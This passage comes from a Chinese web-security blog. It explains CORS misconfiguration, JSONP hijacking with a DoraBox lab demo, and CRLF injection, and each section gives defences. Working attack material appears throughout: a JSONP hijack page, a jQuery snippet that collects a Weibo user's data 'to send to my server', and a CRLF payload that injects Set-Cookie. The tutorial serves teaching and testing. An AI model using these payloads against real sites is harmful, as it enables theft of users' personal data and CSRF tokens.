<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://attacker.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>可能存在：同时存在如下两个请求头</li>
</ol>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>但是如果是如下组合，则绝对没有漏洞，因为该配置下浏览器会自动阻止：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<h2 id="6、结合XSS"><a href="#6、结合XSS" class="headerlink" title="6、结合XSS"></a>6、结合XSS</h2><p>有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。</p>
<h2 id="7、漏洞扫描"><a href="#7、漏洞扫描" class="headerlink" title="7、漏洞扫描"></a>7、漏洞扫描</h2><p>可以使用 Xray 联动 BurpSuite 进行扫描，如下是 Xray 扫出来的一次 CORS：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646821023821-97377747-cea6-4876-b245-a1c092c8fcc5.png" alt="img">    同时 github上 提供了一个关于扫描 CORS 配置漏洞的脚本，<a href="https://github.com/chenjj/CORScanner%E3%80%82">https://github.com/chenjj/CORScanner。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/CORScanner# python cors_scan.py -h</span><br><span class="line">usage: cors_scan.py [-h] [-u URL] [-i INPUT] [-t THREADS] [-o OUTPUT]</span><br><span class="line">                   [-v [VERBOSE]] [-d [HEADERS [HEADERS ...]]]</span><br><span class="line"> </span><br><span class="line">OPTIONS:</span><br><span class="line"> -h, --help            show this help message and exit</span><br><span class="line"> -u URL, --url URL     URL/domain to check it&#x27;s CORS policy</span><br><span class="line"> -i INPUT, --input INPUT</span><br><span class="line">                       URL/domain list file to check their CORS policy</span><br><span class="line"> -t THREADS, --threads THREADS</span><br><span class="line">                       Number of threads to use for CORS scan</span><br><span class="line"> -o OUTPUT, --output OUTPUT</span><br><span class="line">                       Save the results to text file</span><br><span class="line"> -v [VERBOSE], --verbose [VERBOSE]</span><br><span class="line">                       Enable Verbosity and display results in realtime</span><br><span class="line"> -d [HEADERS [HEADERS ...]], --headers [HEADERS [HEADERS ...]]</span><br><span class="line">                       Add headers to the request.</span><br><span class="line"> </span><br><span class="line">Example: python cors_scan.py -u google.com</span><br></pre></td></tr></table></figure>

<p>我们将检测的域名写在一个记事本里，然后使用-i参数去进行批量扫描。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646821922236-9de52c6a-3ede-495f-aa71-b6f9e2cafc93.png" alt="img"></p>
<h2 id="8、防护方案"><a href="#8、防护方案" class="headerlink" title="8、防护方案"></a>8、防护方案</h2><ol>
<li>关闭不必要开启的CORS；</li>
<li>白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 <code>Access-Control-Allow-Origin</code> 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值；</li>
<li>仅允许使用安全协议，避免中间人攻击；</li>
<li>尽可能的返回 <code>Vary: Origin</code> 头部，以避免攻击者利用浏览器缓存进行攻击；</li>
<li>避免将 <code>Access-Control-Allow-Credentials</code> 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false；</li>
<li>限制跨域请求允许的方法，<code>Access-Control-Allow-Methods</code> 最大限度地减少所涉及的方法，降低风险；</li>
<li>限制浏览器缓存期限：建议通过 <code>Access-Control-Allow-Methods</code> 和 <code>Access-Control-Allow-Headers</code> 头部，限制浏览器缓存信息的时间。通过配置 <code>Access-Control-Max-Age</code> 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略；</li>
<li>仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。</li>
</ol>
<h1 id="三、JSONP劫持"><a href="#三、JSONP劫持" class="headerlink" title="三、JSONP劫持"></a>三、JSONP劫持</h1><p>JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案，它是 json 的一种“使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>
<p>JSONP 实现的基本原理是利用了 HTML 里 <code>&lt;script&gt;&lt;/script&gt;</code> 元素标签，远程调用 JSON 文件来实现数据传递。当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
<h2 id="1、利用过程"><a href="#1、利用过程" class="headerlink" title="1、利用过程"></a>1、利用过程</h2><ol>
<li><p>用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；</p>
</li>
<li><p>用户通过浏览器向网站A发出URL请求；</p>
</li>
<li><p>网站A向用户返回响应页面，响应页面中注册了 JavaScript 的回调函数和向网站B请求的 script 标签，示例代码如下：</p>
</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Callback</span>(<span class="params">result</span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    alert(result.name);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://B.com/user?jsonp=Callback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>用户收到响应，解析 JS 代码，将回调函数作为参数向网站B发出请求；</li>
<li>网站 B 接收到请求后，解析请求的 URL，以 JSON 格式生成请求需要的数据，将封装的包含用户信息的 JSON 数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Callback(&#123;<span class="attr">&quot;id&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="attr">&quot;email&quot;</span>:<span class="string">&quot;test@test.com&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>网站B数据返回后，浏览器则自动执行 Callback 函数对步骤4返回的 JSON 格式数据进行处理，通过 alert 弹窗展示了用户在网站B的注册信息。另外也可将 JSON 数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646824230812-f5cab659-87fb-4e37-8d38-a6aa0c33cf8b.png" alt="img"></p>
<h2 id="2、靶场实例"><a href="#2、靶场实例" class="headerlink" title="2、靶场实例"></a>2、靶场实例</h2><p>下面以 DoraBox 靶场的 JSONP 劫持漏洞为演示案例：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823394399-8d8240de-5d83-4082-b5e1-7b565bca90dc.png" alt="img"></p>
<p>访问 JSONP 靶场环境页面：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823420976-8419f70b-72a2-4a95-9ec5-05e7d3887503.png" alt="img"></p>
<p>其服务端源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- jsonp.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;../class/function.class.php&quot;</span>;</span><br><span class="line">   <span class="variable">$reqMethod</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">   <span class="variable">$reqValue</span> = <span class="string">&quot;callback&quot;</span>;</span><br><span class="line">   <span class="variable">$p</span> = <span class="keyword">new</span> Func(<span class="variable">$reqMethod</span>, <span class="variable">$reqValue</span>);</span><br><span class="line">   <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;Vulkey_Chen&#x27;</span>, <span class="string">&#x27;mobilephone&#x27;</span> =&gt; <span class="string">&#x27;13188888888&#x27;</span>, <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;admin@gh0st.cn&#x27;</span>, <span class="string">&#x27;address&#x27;</span> =&gt; <span class="string">&#x27;中华人民共和国&#x27;</span>, <span class="string">&#x27;**&#x27;</span> =&gt; <span class="string">&#x27;Cool Man&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(!@<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>])&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="variable">$callback</span> = htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]);</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$callback&#125;</span>(&quot;</span> . <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点关注：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!@<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$callback</span> = htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$callback&#125;</span>(&quot;</span> . <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这里首先以 get 形式接收到 callback 的值，如果 callback 为空，则忽略警告输出 info 的 json 格式数据：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823581576-68fe4343-9303-4f97-8d1d-82f18534af54.png" alt="img"></p>
<p>如果 callback 值不为空，则对这个值做一个过滤后输出，然后后面还是输出 json 格式的 info 的值：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823593356-21cbd7d9-652f-4416-906c-058786ae4f1f.png" alt="img"></p>
<p>从这段代码我们可以看到，callback 的值是可以动态输出的，如果我们现在拿到了一个以jsonp 方式传输用户认证后数据的网站，我们就可以构造出一个恶意的 jsonp 调用页面，然后诱使用户访问我们的页面，从而达到一个截取用户信息的目的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP劫持测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">result</span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">        </span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(result.mobilephone);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/DoraBox-master/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将上面的 <code>jsonp_attack.html</code> 页面放在本地 phpstudy 搭建的服务网站根目录下，浏览器进行访问，成功获得敏感信息（手机号码）：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823903545-64401d92-e943-42bc-bb34-f5ef68fc2472.png" alt="img"></p>
<h2 id="3、漏洞挖掘"><a href="#3、漏洞挖掘" class="headerlink" title="3、漏洞挖掘"></a>3、漏洞挖掘</h2><ol>
<li>搜索引擎 Hacking 语法——<code>site:target.com inurl:?callback</code></li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646824047067-c71cf15c-909d-472c-80ed-d3b1cd364474.png" alt="img"></p>
<ol start="2">
<li>浏览器-调试-搜索关键字（json/jsonp/callback）：</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646824087519-21282eed-e6d3-49f0-802a-53722b17c75e.png" alt="img"></p>
<h2 id="4、JSONP漏洞利用技巧"><a href="#4、JSONP漏洞利用技巧" class="headerlink" title="4、JSONP漏洞利用技巧"></a>4、JSONP漏洞利用技巧</h2><p>JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作( 水坑攻击 )，下面的一个例子就可以说是在模拟水坑攻击</p>
<p>当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">&#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> id = json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> screen_name = json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;screen_name&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> profile_image_url = json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;profile_image_url&quot;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> post_data = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;id=&quot;</span> + id + <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;screen_name=&quot;</span> + screen_name + <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;profile_image_url=&quot;</span> + <span class="built_in">encodeURIComponent</span>(profile_image_url);</span><br><span class="line">    <span class="built_in">console</span>.log(post_data);</span><br><span class="line">    <span class="comment">// 发送到我的服务器上</span></span><br><span class="line">&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>既然是窃取敏感信息，那么敏感信息除了一些 email 手机号 用户名等还有什么呢？没错，甚至可以是 CSRF Token 信息，有时候在 CSRF token 获取不到但是又找不到 XSS 的攻击点的时候不妨考虑一下 jsonp 劫持。</p>
<h2 id="5、漏洞危害"><a href="#5、漏洞危害" class="headerlink" title="5、漏洞危害"></a>5、漏洞危害</h2><p>JSONP是一种敏感信息泄露的漏洞，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站， <strong>网站中包含其他网站的JSONP漏洞利用代码</strong> ，将链接通过邮件等形式推送给受害人， 如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息， 这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p>
<h2 id="6、防护方案"><a href="#6、防护方案" class="headerlink" title="6、防护方案"></a>6、防护方案</h2><ol>
<li>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。</li>
<li>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。</li>
<li>严格过滤 callback 函数名及 JSON 里数据的输出。</li>
<li>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。</li>
<li>其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</li>
</ol>
<h1 id="四、CORS与JSONP的比较"><a href="#四、CORS与JSONP的比较" class="headerlink" title="四、CORS与JSONP的比较"></a>四、CORS与JSONP的比较</h1><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
<p>JSONP只支持<code>GET</code>请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><ul>
<li><p><a href="https://blog.csdn.net/weixin_39190897/article/details/113769462">https://blog.csdn.net/weixin_39190897/article/details/113769462</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/happystudyhuan/p/11583384.html">https://www.cnblogs.com/happystudyhuan/p/11583384.html</a></p>
</li>
<li><p><a href="https://ruanyifeng.com/blog/2016/04/cors.html">https://ruanyifeng.com/blog/2016/04/cors.html</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF注入（HTTP响应拆分/截断）</title>
    <url>/post/60a54be8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2023年HW厂商斗象面试题——CRLF注入</p>
<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>HTTP报文中， HTTP header之间是由一个CRLF字符序列分隔开的，HTTP Header与Body是用两个CRLF分隔的，浏览器根据这两个CRLF来取出HTTP内容并显示出来。 </p>
<p>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</p>
<p> 所以如果用户的输入在HTTP返回包的Header处回显，便可以通过CRLF来提前结束响应头，在响应内容处注入攻击脚本。因此CRLF Injection又叫HTTP响应拆分/截断（HTTP Response Splitting）简称HRS。</p>
<h1 id="二、漏洞知识拓展"><a href="#二、漏洞知识拓展" class="headerlink" title="二、漏洞知识拓展"></a>二、漏洞知识拓展</h1><p>CRLF指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)。</p>
<p>CRLF的概念源自打字机，表明行的结束，计算机出现后沿用了这个概念。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回车符：光标移到行首，</span><br><span class="line">换行符：光标垂直移到下行。</span><br></pre></td></tr></table></figure>

<p>键盘上的回车键(Enter)就可以执行该操作。但是不同的操作系统，行的结束符是不一样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：使用CRLF表示行的结束</span><br><span class="line">Linux/Unix：使用LF表示行的结束</span><br><span class="line">MacOS：早期使用CR表示，现在好像也用LF表示行的结束</span><br></pre></td></tr></table></figure>

<p>所以同一文件在不同操作系统中打开，内容格式可能会出现差异，这是行结束符不一致导致的。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1679840337929-869e3701-156a-4fe4-a048-a1ded57e616a.png" alt="1679840337929-869e3701-156a-4fe4-a048-a1ded57e616a"></p>
<h1 id="三、漏洞检测"><a href="#三、漏洞检测" class="headerlink" title="三、漏洞检测"></a>三、漏洞检测</h1><p>CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据<strong>输出在HTTP响应头</strong>中。（XSS一般输出在主体中）</p>
<p>所以CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。</p>
<h2 id="1、找到注入点，构造恶意的CRLF字符"><a href="#1、找到注入点，构造恶意的CRLF字符" class="headerlink" title="1、找到注入点，构造恶意的CRLF字符"></a>1、找到注入点，构造恶意的CRLF字符</h2><p>正常请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://wolke.cn/index.php?url=http://baidu.com</span><br></pre></td></tr></table></figure>

<p>抓包，在请求行的url参数中加入特殊构造的CRLF字符</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=http://baidu.com%0d%0aSet-Cookie:crlf=true</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wolke.cn</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.1.1945309492.1638725693; _ga_Q0YHC68NHX=GS1.1.1677577526.284.0.1677577526.0.0.0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;111&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<h2 id="2、查看恶意数据是否在响应头中输出"><a href="#2、查看恶意数据是否在响应头中输出" class="headerlink" title="2、查看恶意数据是否在响应头中输出"></a>2、查看恶意数据是否在响应头中输出</h2><p>将修改后的请求包提交给服务器端，查看服务器端的响应。发现响应首部中多了个Set-Cookie字段。这就证实了该系统存在CRLF注入漏洞，因为我们输入的恶意数据，作为响应首部字段返回给了客户端。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://baidu.com</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>crlf=true</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br></pre></td></tr></table></figure>

<p>很多人看到这里可能就想不明白，我请求包写入的恶意数据，怎么就被当成响应首部字段输出了？下面我们来看看服务器端源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]) &amp;&amp; (<span class="variable">$_COOKIE</span>[<span class="string">&quot;security_level&quot;</span>]) != <span class="string">&quot;1&quot;</span> &amp;&amp; <span class="variable">$_COOkIE</span>[<span class="string">&quot;security_level&quot;</span>] != <span class="string">&quot;2&quot;</span>))&#123;</span><br><span class="line">  <span class="comment">// Debugging</span></span><br><span class="line">  <span class="comment">// echo &quot;Not santized: &quot; . $_GET[&quot;url&quot;];</span></span><br><span class="line"></span><br><span class="line">  header(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是其中一段代码，用PHP写的，需要大家有一定的语言基础。这段代码的意思是：当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。</p>
<p>此时服务器端接收到的url参数值是我们修改后的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://baidu.com%0d%0aSet-Cookie:crlf=true</span><br></pre></td></tr></table></figure>

<p>在url参数值拼接到Location字符串中，设置成响应头后，响应包此时应该是下面这样的：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://baidu.com%0d%0aSet-Cookie: crlf=true</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br></pre></td></tr></table></figure>

<p>%0d和%0a分别是CR和LF的URL编码。前面我们讲到，HTTP规范中，行以CRLF结束。所以当检测到%0d%0a后，就认为Location首部字段这行结束了，Set-Cookie就会被认为是下一行，如下所示</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://baidu.com</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>crlf=true</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br></pre></td></tr></table></figure>

<p>而我们构造的Set-Cookie字符在HTTP中是一个设置Cookie的首部字段，这个时候就会将crlf=true设置成Cookie。</p>
